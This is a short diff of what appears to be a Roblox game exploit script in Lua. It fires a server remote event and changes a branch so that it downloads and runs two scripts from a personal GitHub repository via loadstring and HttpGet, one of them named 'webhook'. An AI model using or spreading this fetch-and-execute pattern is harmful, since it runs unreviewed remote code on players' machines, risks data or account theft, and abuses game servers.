@@ -32,5 +32,6 @@ local argsgg = {
 wait(3)
     game:GetService("ReplicatedStorage").dataRemoteEvent:FireServer(unpack(argsgg))
 else
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/feezaza123/bounty/main/Main", true))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/feezaza123/bounty/main/webhook", true))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/feezaza123/bounty/main/yokai", true))()
 end
